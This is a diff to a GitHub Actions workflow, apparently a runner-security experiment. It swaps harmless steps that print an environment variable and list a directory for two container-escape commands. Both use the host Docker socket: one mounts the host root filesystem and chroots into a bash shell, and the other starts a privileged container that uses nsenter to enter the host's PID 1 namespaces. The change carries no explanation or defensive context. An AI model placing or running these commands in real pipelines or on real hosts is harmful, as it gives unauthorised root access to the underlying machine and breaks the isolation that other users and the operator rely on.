@@ -5,11 +5,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            GITHUB_REPOSITORY=magnologan/goof
-            printenv GITHUB_REPOSITORY 
-      - uses: actions/checkout@v2
-      - run: |
-            ls -lha /home/runner/work/gha-test/gha-test
+            docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+            docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 
             
        
